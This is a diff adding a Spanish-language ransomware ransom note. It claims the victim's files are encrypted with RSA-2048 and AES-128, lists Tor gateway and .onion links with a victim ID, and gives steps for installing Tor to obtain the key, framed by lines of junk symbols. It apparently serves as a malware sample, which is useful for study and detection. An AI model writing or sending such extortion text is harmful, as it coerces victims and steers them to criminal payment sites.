@@ -1,0 +1,25 @@
+﻿*.__~=_~~=|=~~*|~$$+
+            ¡¡¡INFORMACIÓN IMPORTANTE!!!
+
+Todos sus archivos están encriptados con RSA-2048 y los sistemas de cifrado AES-128.
+Para más información sobre RSA consulte los siguientes enlaces:
+    http://es.wikipedia.org/wiki/RSA
+    http://es.wikipedia.org/wiki/Advanced_Encryption_Standard
+
+La desencriptación de sus archivos es solo posible con una clave privada y un programa, 
+el cual está en nuestro servidor secreto.
+Para recibir su clave privada de clic en uno de los siguientes enlaces:
+    1. http://25z5g623wpqpdwis.tor2web.org/042F697338EA0014
+    2. http://25z5g623wpqpdwis.onion.to/042F697338EA0014
+    3. http://25z5g623wpqpdwis.onion.cab/042F697338EA0014
+
+Si todos estos enlaces no están disponibles, siga los siguientes pasos:
+    1. Descargue e instale el Navegador Tor: https://www.torproject.org/download/download-easy.html
+    2. Después de una instalación exitosa, ejecute el navegador y espere la inicialización.
+    3. Introduzca en la barra de direcciones: 25z5g623wpqpdwis.onion/042F697338EA0014
+    4. Siga las instrucciones en el sitio.
+
+¡¡¡Su ID de identificación personal: 042F697338EA0014!!!
+-|+-|~~-$$==-~=
+-__-=+|
+.+$$_~-.$-.||$~||.__
